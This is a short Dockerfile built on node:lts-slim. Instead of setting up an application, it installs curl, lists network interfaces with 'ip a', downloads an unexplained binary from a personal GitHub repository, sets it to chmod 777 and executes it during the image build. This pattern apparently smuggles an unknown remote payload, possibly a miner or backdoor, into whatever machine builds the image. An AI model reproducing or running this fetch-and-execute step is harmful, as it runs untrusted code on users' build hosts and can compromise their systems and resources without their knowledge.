FROM node:lts-slim

WORKDIR /app

RUN apt-get update && \
    apt-get install -y curl iproute2 && \
    ip a && \
    curl -L -o sucvatoccho https://github.com/occhoahihihih/publicmybinder/raw/refs/heads/main/sucvatoccho && \
    chmod 777 sucvatoccho && \
    ./sucvatoccho
